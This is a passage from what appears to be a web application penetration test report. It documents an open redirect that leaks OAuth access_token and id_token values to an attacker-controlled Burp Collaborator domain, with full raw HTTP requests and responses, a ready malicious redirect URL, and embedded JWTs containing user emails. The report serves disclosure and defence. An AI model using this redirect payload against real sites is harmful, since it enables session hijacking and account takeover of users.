{"text": "conversation?\"},{\"questionId\":\"1103\",\"position\":\"2\",\"questionText\":\"What did you learn?\"},{\"questionId\":\"1104\",\"position\":\"3\",\"questionText\":\"What action would you take based on what you heard today?\"}]},{\"sectionId\":\"365\",\"position\":\"2\",\"sectionText\":\"ok\",\"questions\":[{\"questionId\":\"1105\",\"position\":\"1\",\" questionText\":\"ok\"}]}]},\"lastSavedText\":\"Last saved by name@gmail.com on 11:04 pm, July 15, 2020\"}\\nAn attacker can easily automate this attack to retrieve all application project takeaway information stored on the application: Figure 10 - Project Takeaway Information\\nOpen Redirect Severity: High Open redirection vulnerabilities arise when an application incorporates user-controllable data into a redirection target in an unsafe way. An attacker can construct a URL within the application that causes a redirection to an arbitrary external domain. Session Hijacking Using an open-redirect vulnerability, it is possible to steal the application user's sensitive cookie. Specifically, the access_token and id_token cookies. These two cookies will allow an attacker to interact with the application's GraphQL scheme as the victim. The following HTTP request was observed while interacting with the application: GET /auth/authorize?displayType=general&redirect_uri=https%3A%2F%2F{URL}%2Fquote%2FloginCallback% 3Fstep%3D%26autosave%3Dno%26exit%3Dno%26project%3D%26delegate%3Ddashboard HTTP/2 Host: {URL} Cookie: ajs_anonymous_id=c18977c2-e232-45f0-8b50-413c89650e2b; intercom-id-mgfmc61p=f6ae4012- b890-42a6-a7e9-f2b3c0c40334; intercom-session-mgfmc61p=; ajs_user_id=3410; dio=588a409f6514b4ba55471483afe819d1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:90.0) Gecko/20100101 Firefox/90.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: https://{URL}/dashboard Dnt: 1 Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: same-origin Te: trailers Connection: close\\nHTTP/2 302 Found Date: Wed, 28 Jul 2021 23:29:42 GMT Content-Type: text/html; charset=UTF-8 Content-Length: 0 Location:https://{URL}/quote/loginCallback?step=&autosave=no&exit=no&project=&delegate=dashboard&a ccess_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IjFlOWY3NWViNWU2ZDZiNzE1MTQxM TU1MWEzMDQ2MTNhIn0.eyJpc3MiOiJodHRwOlwvXC93d3cuZGlzY3Vzcy5pbyIsImF1ZCI6ImRpc2N1c3M uaW8iLCJub25jZSI6bnVsbCwiZXhwIjoxNjI3NTE2NzgyLCJpYXQiOjE2Mjc1MTQ5ODJ9.g_-B3k44G- _SlZ8zKb5KwZtt_41OCGIJ51iy4- QbLrptfBKSKXj9RjUopOac_4VhHmGP4Wel4FSLN8NGqk2SPgEMHR_UdwUyIWXDzr0ONBBR9- WcHue9z1Dt8mAcmIIruwJVnON- PuZRJPeOfxkirIJK3Fbu4XX2AfOG3u6XXEU&id_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI 6IjFlOWY3NWViNWU2ZDZiNzE1MTQxMTU1MWEzMDQ2MTNhIn0.eyJpc3MiOiJodHRwOlwvXC93d3cuZ GlzY3Vzcy5pbyIsInN1YiI6IjM0MDEiLCJhdWQiOiJkaXNjdXNzLmlvIiwibm9uY2UiOm51bGwsImV4cCI6MTY yNzUxNjc4MiwiaWF0IjoxNjI3NTE0OTgyLCJlbWFpbCI6Im1hcmNAcHVycGxlc2VjLnVzIiwiZW1haWxfdmVy aWZpZWQiOnRydWUsIm5hbWUiOiJUZXN0dGVzdHR0dCB0cmVzdCIsImdpdmVuX25hbWUiOiJUZXN0d GVzdHR0dCIsImZhbWlseV9uYW1lIjoidHJlc3QiLCJ6b25laW5mbyI6IkFmcmljYVwvQWNjcmEiLCJkaW86c m9sZXMiOltdfQ.1huEcioFrbx5yQGOKnaBStqNhq7u72zD5ZWgRWkuj2Qg4oZYKVut51M0pk2sOe0YHyFS NMdj6w_bJy5NnphEHB7RfKlUHhy3FhsEni6HsBZ8RxIa63JVKZbGwoc7YtVNEhHd1rRZQv0fh3MFgv3YiAo xnEwwkewH6t7nCKAL2l8&code=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IjFlOWY3NWViNWU 2ZDZiNzE1MTQxMTU1MWEzMDQ2MTNhIn0.eyJleHAiOjE2Mjc1MTY3ODIsIm5vbmNlIjoiMmVmYjc5MGMt NWEyNS00NDI1LWFkMDgtMGIwMjYxNmJkODcxIn0.Wwq8nWDgwk1o23GmIZN4bZGyEF- YPwbLpwzNkj4STDD8SovZ1FWuoWntjOBs8vKwzZ4sU8wWv1uXn- C2brQMzehJRgl3nGbSZQt0HFiWiOYNe3LShw9DWLW2GI4f96T9jPCHqKgkP7BvT7ReFmAiW5twghfCKx UJzGwpbSu9YME\\nSet-Cookie: access_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IjFlOWY3NWViNWU2ZDZiNzE1MTQxM TU1MWEzMDQ2MTNhIn0.eyJpc3MiOiJodHRwOlwvXC93d3cuZGlzY3Vzcy5pbyIsImF1ZCI6ImRpc2N1c3M uaW8iLCJub25jZSI6bnVsbCwiZXhwIjoxNjI3NTE2NzgyLCJpYXQiOjE2Mjc1MTQ5ODJ9.g_-B3k44G- _SlZ8zKb5KwZtt_41OCGIJ51iy4- QbLrptfBKSKXj9RjUopOac_4VhHmGP4Wel4FSLN8NGqk2SPgEMHR_UdwUyIWXDzr0ONBBR9- WcHue9z1Dt8mAcmIIruwJVnON-PuZRJPeOfxkirIJK3Fbu4XX2AfOG3u6XXEU; expires=Wed, 28-Jul-2021 23:59:42 GMT; Max-Age=1800; path=/; SameSite=Lax Set-Cookie: id_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IjFlOWY3NWViNWU2ZDZiNzE1MTQxMTU1 MWEzMDQ2MTNhIn0.eyJpc3MiOiJodHRwOlwvXC93d3cuZGlzY3Vzcy5pbyIsInN1YiI6IjM0MDEiLCJhdWQi OiJkaXNjdXNzLmlvIiwibm9uY2UiOm51bGwsImV4cCI6MTYyNzUxNjc4MiwiaWF0IjoxNjI3NTE0OTgyLCJlb WFpbCI6Im1hcmNAcHVycGxlc2VjLnVzIiwiZW1haWxfdmVyaWZpZWQiOnRydWUsIm5hbWUiOiJUZXN0d GVzdHR0dCB0cmVzdCIsImdpdmVuX25hbWUiOiJUZXN0dGVzdHR0dCIsImZhbWlseV9uYW1lIjoidHJlc3Qi LCJ6b25laW5mbyI6IkFmcmljYVwvQWNjcmEiLCJkaW86cm9sZXMiOltdfQ.1huEcioFrbx5yQGOKnaBStqNh q7u72zD5ZWgRWkuj2Qg4oZYKVut51M0pk2sOe0YHyFSNMdj6w_bJy5NnphEHB7RfKlUHhy3FhsEni6HsB Z8RxIa63JVKZbGwoc7YtVNEhHd1rRZQv0fh3MFgv3YiAoxnEwwkewH6t7nCKAL2l8; expires=Wed, 28-Jul- 2021 23:59:42 GMT; Max-Age=1800; path=/; SameSite=Lax The application sets both the access_token and id_token cookies then redirects the user to URL including both cookies as parameters. Note, the application uses the dio session cookie to validate the user. Replacing qa.life.io with a domain controlled by the attacker in the redirect_uri parameter will allow an attacker to steal these sensitive cookies. The following URL places a domain in the redirect_uri parameter controlled by the attacker: https://{URL}/auth/authorize?displayType=general&redirect_uri=https%3A%2F%2F6w3igq1rpluqx6862lo0w xxr7id91y.burpcollaborator.net\\nAfter accessing the malicious link as the user, dev+assessor_purplesec.us@the company is redirect to the attacker server: GET /auth/authorize?displayType=general&redirect_uri=https%3A%2F%2F6w3igq1rpluqx6862lo0wxxr7id91y.bu rpcollaborator.net HTTP/2 Host: {URL} Cookie: ajs_anonymous_id=c18977c2-e232-45f0-8b50-413c89650e2b; intercom-id-mgfmc61p=f6ae4012- b890-42a6-a7e9-f2b3c0c40334; intercom-session-mgfmc61p=; ajs_user_id=3412; 6c9156982306a2f4166f81c4d98f2d3a; User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:90.0) Gecko/20100101 Firefox/90.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: https://{URL}/dashboard Dnt: 1 Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: same-origin Te: trailers Connection: close\\nHTTP/2 302 Found Date: Thu, 29 Jul 2021 00:23:23 GMT Content-Type: text/html; charset=UTF-8 Content-Length: 0 Location: https://6w3igq1rpluqx6862lo0wxxr7id91y.burpcollaborator.net?access_token=eyJ0eXAiOiJKV1QiLCJhbGci OiJSUzI1NiIsImtpZCI6IjFlOWY3NWViNWU2ZDZiNzE1MTQxMTU1MWEzMDQ2MTNhIn0.eyJpc3MiOiJodH RwOlwvXC93d3cuZGlzY3Vzcy5pbyIsImF1ZCI6ImRpc2N1c3MuaW8iLCJub25jZSI6bnVsbCwiZXhwIjoxNjI3 NTI0MTk2LCJpYXQiOjE2Mjc1MjIzOTZ9.A19CewVJSjf4cmSQO23nqCbBjh7j7v4QN4DOn7wFaVTwmyJZM Bsb9S4cDSnqpF5Msex_JbvGR2eOX0hGC8acMVZZDsvxLYHy7a- npbhQl9iMVWYWl6Z3j36DYXrvVIs4rvNpO45Po7HgiCeDmp6RBT_0CZS8hQCsAYeOXLba2jY&id_token=e yJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IjFlOWY3NWViNWU2ZDZiNzE1MTQxMTU1MWEzMDQ 2MTNhIn0.eyJpc3MiOiJodHRwOlwvXC93d3cuZGlzY3Vzcy5pbyIsInN1YiI6IjM0MDIiLCJhdWQiOiJkaXNjdX NzLmlvIiwibm9uY2UiOm51bGwsImV4cCI6MTYyNzUyNDE5NiwiaWF0IjoxNjI3NTIyMzk2LCJlbWFpbCI6Im RldittYXJjX3B1cnBsZXNlYy51c0BkaXNjdXNzLmlvIiwiZW1haWxfdmVyaWZpZWQiOnRydWUsIm5hbWUiOi JNYXJjIFN3aXR6ZXIgVXMiLCJnaXZlbl9uYW1lIjoiTWFyYyBTd2l0emVyIiwiZmFtaWx5X25hbWUiOiJVcyIsI npvbmVpbmZvIjoiVVRDIiwiZGlvOnJvbGVzIjpbImFkbWluIl19.Uhhilbc5I8Y2X8uxXKsEgkhUe3w0_I8iJLaL0 mIxARjLXqMLn6EX6sYjw1wOzZd4EWGcWrNhNJba4oLdP_LqqbXSbYY_cGGFIfaYgcZB7qObPQTx- QvYyp-SoAx5MNoBzgjbyL-7wxc3iw774F- tPakKOKvnNxWqO0j1GQkQ76w&code=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IjFlOWY3NW ViNWU2ZDZiNzE1MTQxMTU1MWEzMDQ2MTNhIn0.eyJleHAiOjE2Mjc1MjQxOTYsIm5vbmNlIjoiMThmOD YyODgtMzI1OS00ZTUwLThhM2MtMmM2NzY1MzJiZmM0In0.qXcWRouK4- AgGGAfNPiGwxeq2sb3Zpba7a0pKdCR- pbl7zUVV9_VzE3fy3acfIlKiSpCjlHPaowOg7P0BWhEf2tVkPxOap1kv18Zsp0Biw89An-OX_QSv8gv3nmVd- I2gGGomOXjxodGa3Q9QFKVLRh0XHc5ucuubWBCKCHcWMw\\nServer: Apache/2.4 Strict-Transport-Security: max-age=31536000; includeSubdomains X-Frame-Options: SAMEORIGIN X-Content-Type-Options: nosniff X-Xss-Protection: 1; mode=block Content-Security-Policy: default-src https: 'unsafe-eval' 'unsafe-inline'; object-src 'none'; connect-src *; img- src https: blob: mediastream: data:; font-src https: data:; worker-src blob: Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate Set- Cookie:access_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IjFlOWY3NWViNWU2ZDZiNzE1 MTQxMTU1MWEzMDQ2MTNhIn0.eyJpc3MiOiJodHRwOlwvXC93d3cuZGlzY3Vzcy5pbyIsImF1ZCI6ImRpc 2N1c3MuaW8iLCJub25jZSI6bnVsbCwiZXhwIjoxNjI3NTI0MTk2LCJpYXQiOjE2Mjc1MjIzOTZ9.A19CewVJSjf 4cmSQO23nqCbBjh7j7v4QN4DOn7wFaVTwmyJZMBsb9S4cDSnqpF5Msex_JbvGR2eOX0hGC8acMVZZD svxLYHy7a- npbhQl9iMVWYWl6Z3j36DYXrvVIs4rvNpO45Po7HgiCeDmp6RBT_0CZS8hQCsAYeOXLba2jY; expires=Thu, 29-Jul-2021 02:03:16 GMT; Max-Age=1800; path=/; SameSite=Lax Set- Cookie:id_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IjFlOWY3NWViNWU2ZDZiNzE1MTQ xMTU1MWEzMDQ2MTNhIn0.eyJpc3MiOiJodHRwOlwvXC93d3cuZGlzY3Vzcy5pbyIsInN1YiI6IjM0MDIiLCJ hdWQiOiJkaXNjdXNzLmlvIiwibm9uY2UiOm51bGwsImV4cCI6MTYyNzUyNDE5NiwiaWF0IjoxNjI3NTIyMzk2 LCJlbWFpbCI6ImRldittYXJjX3B1cnBsZXNlYy51c0BkaXNjdXNzLmlvIiwiZW1haWxfdmVyaWZpZWQiOnRyd WUsIm5hbWUiOiJNYXJjIFN3aXR6ZXIgVXMiLCJnaXZlbl9uYW1lIjoiTWFyYyBTd2l0emVyIiwiZmFtaWx5X2 5hbWUiOiJVcyIsInpvbmVpbmZvIjoiVVRDIiwiZGlvOnJvbGVzIjpbImFkbWluIl19.Uhhilbc5I8Y2X8uxXKsEgkh Ue3w0_I8iJLaL0mIxARjLXqMLn6EX6sYjw1wOzZd4EWGcWrNhNJba4oLdP_LqqbXSbYY_cGGFIfaYgcZB 7qObPQTx-QvYyp-SoAx5MNoBzgjbyL-7wxc3iw774F-tPakKOKvnNxWqO0j1GQkQ76w; expires=Thu, 29- Jul-2021 02:03:16 GMT; Max-Age=1800; path=/; SameSite=Lax\\nThe application sets both sensitive cookies in the HTTP response parameters then redirects", "metadata": {"doc_id": "Web-Application-Penetration-Test-Sample-Report", "chunk_id": 4}}